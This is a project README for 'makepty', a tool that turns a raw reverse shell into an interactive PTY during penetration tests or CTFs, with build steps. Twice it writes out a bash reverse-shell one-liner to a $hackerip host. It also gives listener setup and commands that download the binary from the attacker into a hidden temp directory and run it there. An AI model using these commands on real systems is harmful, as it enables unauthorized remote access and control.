# makepty
Create a PTY linked to stdin and stdout


This tool creates a pseudo-TTY which takes input from standard input and prints to standard output.
I made it as another potential option for building a PTY on a raw (netcat) shell during a penetration test or CTF.
It is similar to `python3 -c 'import pty;pty.spawn("/bin/bash")'` but also works on platforms that lack Python.

I was inspired to create it after I took over a FreeBSD box and found that it didn't have python and my pyinstaller version only worked on Linux.

## Why

When taking over a target computer, pentesters will generally use a reverse shell with methods such as `bash -c 'bash -i >& /dev/tcp/$hackerip/9443 0>&1'`

This initial shell will have no PTY, thus allowing only non-interactive commands to be run.
A hacker generally needs to upgrade to a PTY to be able to easily run commands such as `sudo` or `vi` remotely.
`makepty` is a simple binary that will upgrade a raw shell to a TTY shell.

## Platforms

Tested: Linux, FreeBSD

Untested, but might work if you compile it: MacOS, Windows

## Usage

On attacker system, start a listener via for example: `ncat -lvp 9443`
On victim, get a reverse shell through for example `bash -c 'bash -i >& /dev/tcp/$hackerip/9443 0>&1'`

Now you will have a raw shell on your ncat listener. To upgrade, put makepty on the target system and run it. Example:
On attacker, make a directory and move makepty for target system to it, then run a web server:
```sh
mkdir /tmp/web
cp ~/tools/makepty-freebsd /tmp/web/
cd /tmp/web
python3 -m http.server 8082
```
On victim, download it and run it:
```sh
mkdir /tmp/.w
cd /tmp/.w
curl http://$hackerip:8082/makepty-freebsd > makepty # or `ftp http://$hackerip:8082/makepty-freebsd` as `ftp` on BSD is a non-interactive curl-like command
chmod +x makepty
./makepty bash # or any other shell install on the system. Defaults to `sh`
```

You will now have a PTY shell, as can be tested with `stty -a`.

To further improve your experience, set your own shell to raw mode so you can use interactive commands such as `vi`, and use ctrl+c, shell completion, etc. on the victim.

On attacker shell:
```sh
# First run ctrl+Z to background the reverse shell, then
stty size # get your TTY size, example 55 212 is rows 55, columns 212
stty raw -echo && fg # set your TTY to raw mode and then foreground the shell
# Now you're in the victim shell again
stty rows 55 columns 212 # send TTY size info to PTY on victim
# You can now run commands such as `vi` in fullscreen on your reverse shell
```

### usage example

[![asciicast](https://asciinema.org/a/7NHg67zFhsfZQnU17rY0J9Rtj.svg)](https://asciinema.org/a/7NHg67zFhsfZQnU17rY0J9Rtj)

## Building

This project uses the Rust nightly `strip` feature to reduce binary size. As such, you'll need Rust nightly to build it. Assuming you've got Rust installed, you'll have to install the nightly toolchain with:
```sh
rustup toolchain install nightly
rustup +nightly target add x86_64-unknown-linux-musl
```

Then build:
```sh
cargo +nightly build --target x86_64-unknown-linux-musl --release
```

Cross-compiling for FreeBSD uses https://github.com/wezm/freebsd-cross-build with edit mentioned in https://github.com/wezm/freebsd-cross-build/issues/3 to add the nightly toolchain.

## License

MIT license (see [LICENSE-MIT](LICENSE-MIT) file)
